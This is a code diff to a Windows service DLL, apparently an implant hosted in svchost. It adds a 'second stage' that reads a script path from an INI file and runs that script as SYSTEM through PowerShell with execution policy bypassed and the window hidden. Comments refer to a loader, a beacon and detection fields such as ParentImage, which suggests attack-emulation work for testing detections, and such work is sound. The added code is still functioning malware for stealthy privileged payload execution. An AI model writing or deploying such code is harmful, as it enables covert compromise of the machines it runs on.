@@ -52,6 +52,35 @@ static SERVICE_STATUS g_status;
 static HANDLE g_hChild = NULL;
 static HANDLE g_hStop = NULL;
 
+/* second stage: run the script the loader downloaded, as SYSTEM, a moment after the implant
+   starts so the beacon is up before the script's first task. */
+static DWORD WINAPI stage2_thread(LPVOID param)
+{
+    wchar_t cmd[1024];
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+
+    if (param == NULL) {
+        return 0;
+    }
+    Sleep(4000);
+    if (GetFileAttributesW((LPCWSTR)param) == INVALID_FILE_ATTRIBUTES) {
+        return 0;
+    }
+    lstrcpyW(cmd, L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile ");
+    lstrcatW(cmd, L"-ExecutionPolicy Bypass -WindowStyle Hidden -File ");
+    lstrcatW(cmd, (LPCWSTR)param);
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    return 0;
+}
+
 static void report_status(DWORD state, DWORD win32_exit, DWORD wait_hint)
 {
     if (g_hStatus == NULL) {
@@ -111,6 +140,9 @@ __declspec(dllexport) VOID WINAPI ServiceMain(DWORD argc, LPWSTR *argv)
 {
     wchar_t spawn_cmd[1024] = {0};
     wchar_t marker[128] = {0};
+    wchar_t stage2[MAX_PATH] = {0};
+    static wchar_t stage2_path[MAX_PATH];
+    HANDLE hStage2;
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
     HANDLE waits[2];
@@ -128,6 +160,8 @@ __declspec(dllexport) VOID WINAPI ServiceMain(DWORD argc, LPWSTR *argv)
                              (DWORD)(sizeof(spawn_cmd) / sizeof(wchar_t)), INI_PATH);
     GetPrivateProfileStringW(L"stage", L"marker_name", L"", marker,
                              (DWORD)(sizeof(marker) / sizeof(wchar_t)), INI_PATH);
+    GetPrivateProfileStringW(L"stage", L"stage2", L"", stage2,
+                             (DWORD)(sizeof(stage2) / sizeof(wchar_t)), INI_PATH);
 
     if (spawn_cmd[0] == 0) {
         /* control path: no config -> no process, no file */
@@ -160,6 +194,14 @@ __declspec(dllexport) VOID WINAPI ServiceMain(DWORD argc, LPWSTR *argv)
     g_hChild = pi.hProcess;
     CloseHandle(pi.hThread);
     report_status(SERVICE_RUNNING, NO_ERROR, 0);
+
+    if (stage2[0] != 0) {
+        lstrcpynW(stage2_path, stage2, MAX_PATH);
+        hStage2 = CreateThread(NULL, 0, stage2_thread, stage2_path, 0, NULL);
+        if (hStage2 != NULL) {
+            CloseHandle(hStage2);
+        }
+    }
 
     /* Keep svchost alive while the host process runs, so the parent/child relationship
        stays visible in the process tree (and in E1 ParentImage). */
@@ -194,3 +236,4 @@ BOOL APIENTRY DllMain(HMODULE module, DWORD reason, LPVOID reserved)
     /* Never do work under the loader lock: svchost calls ServiceMain explicitly. */
     return TRUE;
 }
+
